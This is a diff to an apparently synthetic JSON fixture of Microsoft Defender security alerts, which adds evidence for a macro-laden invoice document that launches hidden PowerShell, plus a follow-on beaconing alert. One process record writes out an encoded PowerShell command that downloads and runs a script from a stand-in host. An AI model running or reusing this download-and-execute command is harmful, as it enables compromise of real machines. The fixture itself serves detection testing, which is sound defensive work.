@@ -15,8 +15,143 @@
       "category": "Execution",
       "serviceSource": "microsoftDefenderForEndpoint",
       "detectionSource": "microsoftDefenderForEndpoint",
-      "mitreTechniques": ["T1059.001", "T1105"],
+      "mitreTechniques": [
+        "T1059.001",
+        "T1105"
+      ],
       "description": "powershell.exe ran an encoded command that downloaded and ran a script from an external host.",
+      "evidence": [
+        {
+          "@odata.type": "#microsoft.graph.security.deviceEvidence",
+          "mdeDeviceId": "7c3f9e2a1b8d4c6e0f5a2b9d8c7e6f1a3b4c5d6e",
+          "deviceDnsName": "ws-0142.contoso.com",
+          "hostName": "ws-0142",
+          "lastIpAddress": "10.20.4.142",
+          "lastExternalIpAddress": "198.51.100.14",
+          "roles": [
+            "compromised"
+          ],
+          "verdict": "suspicious",
+          "loggedOnUsers": [
+            {
+              "accountName": "spatel",
+              "domainName": "CONTOSO"
+            }
+          ]
+        },
+        {
+          "@odata.type": "#microsoft.graph.security.userEvidence",
+          "userAccount": {
+            "userPrincipalName": "sam.patel@contoso.com",
+            "azureAdUserId": "0b6c2f1e-1002-4a7b-9c3d-000000000002",
+            "displayName": "Sam Patel",
+            "accountName": "spatel"
+          }
+        },
+        {
+          "@odata.type": "#microsoft.graph.security.processEvidence",
+          "mdeDeviceId": "7c3f9e2a1b8d4c6e0f5a2b9d8c7e6f1a3b4c5d6e",
+          "processId": 4120,
+          "processCreationDateTime": "@minutesAgo:31",
+          "processCommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\spatel\\Downloads\\Invoice-4471.docm\"",
+          "imageFile": {
+            "fileName": "WINWORD.EXE",
+            "sha256": "a1c4f7d2e9b3a6c8d0f2e4b6a8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6"
+          },
+          "parentProcessId": 2210,
+          "parentProcessCreationDateTime": "@minutesAgo:33",
+          "parentProcessImageFile": {
+            "fileName": "OUTLOOK.EXE"
+          },
+          "userAccount": {
+            "userPrincipalName": "sam.patel@contoso.com",
+            "azureAdUserId": "0b6c2f1e-1002-4a7b-9c3d-000000000002",
+            "displayName": "Sam Patel",
+            "accountName": "spatel"
+          }
+        },
+        {
+          "@odata.type": "#microsoft.graph.security.processEvidence",
+          "mdeDeviceId": "7c3f9e2a1b8d4c6e0f5a2b9d8c7e6f1a3b4c5d6e",
+          "processId": 5532,
+          "processCreationDateTime": "@minutesAgo:30",
+          "verdict": "malicious",
+          "processCommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA... (IEX (New-Object Net.WebClient).DownloadString('https://cdn-update-check.example/update-check.ps1'))",
+          "imageFile": {
+            "fileName": "powershell.exe",
+            "sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c",
+            "sha1": "6cbce4a295c163791b60fc23d285e6d84f28ee4c"
+          },
+          "parentProcessId": 4120,
+          "parentProcessCreationDateTime": "@minutesAgo:31",
+          "parentProcessImageFile": {
+            "fileName": "WINWORD.EXE",
+            "sha256": "a1c4f7d2e9b3a6c8d0f2e4b6a8c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6"
+          },
+          "userAccount": {
+            "userPrincipalName": "sam.patel@contoso.com",
+            "azureAdUserId": "0b6c2f1e-1002-4a7b-9c3d-000000000002",
+            "displayName": "Sam Patel",
+            "accountName": "spatel"
+          }
+        },
+        {
+          "@odata.type": "#microsoft.graph.security.fileEvidence",
+          "mdeDeviceId": "7c3f9e2a1b8d4c6e0f5a2b9d8c7e6f1a3b4c5d6e",
+          "verdict": "malicious",
+          "fileDetails": {
+            "fileName": "update-check.ps1",
+            "filePath": "C:\\Users\\spatel\\AppData\\Local\\Temp",
+            "sha256": "4f3c2b1a0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b",
+            "sha1": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"
+          }
+        },
+        {
+          "@odata.type": "#microsoft.graph.security.fileEvidence",
+          "mdeDeviceId": "7c3f9e2a1b8d4c6e0f5a2b9d8c7e6f1a3b4c5d6e",
+          "verdict": "suspicious",
+          "fileDetails": {
+            "fileName": "Invoice-4471.docm",
+            "filePath": "C:\\Users\\spatel\\Downloads",
+            "sha256": "9e8d7c6b5a4f3e2d1c0b9a8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a0f9e8d"
+          }
+        },
+        {
+          "@odata.type": "#microsoft.graph.security.urlEvidence",
+          "url": "https://cdn-update-check.example/update-check.ps1",
+          "verdict": "malicious"
+        },
+        {
+          "@odata.type": "#microsoft.graph.security.dnsEvidence",
+          "domainName": "cdn-update-check.example",
+          "ipAddresses": [
+            {
+              "ipAddress": "203.0.113.77"
+            }
+          ]
+        },
+        {
+          "@odata.type": "#microsoft.graph.security.ipEvidence",
+          "ipAddress": "203.0.113.77",
+          "verdict": "suspicious"
+        }
+      ],
+      "_firstMinutesAgo": 31,
+      "_lastMinutesAgo": 28
+    },
+    {
+      "id": "da1002-2",
+      "title": "Connection to a rare external host after script execution",
+      "severity": "medium",
+      "category": "CommandAndControl",
+      "serviceSource": "microsoftDefenderForEndpoint",
+      "detectionSource": "microsoftDefenderForEndpoint",
+      "mitreTechniques": [
+        "T1071.001"
+      ],
+      "description": "ws-0142 opened repeated HTTPS connections to 203.0.113.77 at a fixed interval after update-check.ps1 ran.",
+      "_firstMinutesAgo": 29,
+      "_lastMinutesAgo": 21,
       "evidence": [
         {
           "@odata.type": "#microsoft.graph.security.deviceEvidence",
@@ -25,19 +160,10 @@
           "hostName": "ws-0142"
         },
         {
-          "@odata.type": "#microsoft.graph.security.userEvidence",
-          "userAccount": { "userPrincipalName": "sam.patel@contoso.com", "azureAdUserId": "0b6c2f1e-1002-4a7b-9c3d-000000000002", "displayName": "Sam Patel", "accountName": "spatel" }
-        },
-        {
-          "@odata.type": "#microsoft.graph.security.processEvidence",
-          "imageFile": { "fileName": "powershell.exe", "sha256": "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c", "sha1": "6cbce4a295c163791b60fc23d285e6d84f28ee4c" }
-        },
-        {
-          "@odata.type": "#microsoft.graph.security.fileEvidence",
-          "fileDetails": { "fileName": "update-check.ps1", "sha256": "4f3c2b1a0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3b", "sha1": "1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b" }
-        },
-        { "@odata.type": "#microsoft.graph.security.urlEvidence", "url": "https://cdn-update-check.example/update-check.ps1" },
-        { "@odata.type": "#microsoft.graph.security.ipEvidence", "ipAddress": "203.0.113.77" }
+          "@odata.type": "#microsoft.graph.security.ipEvidence",
+          "ipAddress": "203.0.113.77",
+          "verdict": "suspicious"
+        }
       ]
     }
   ]
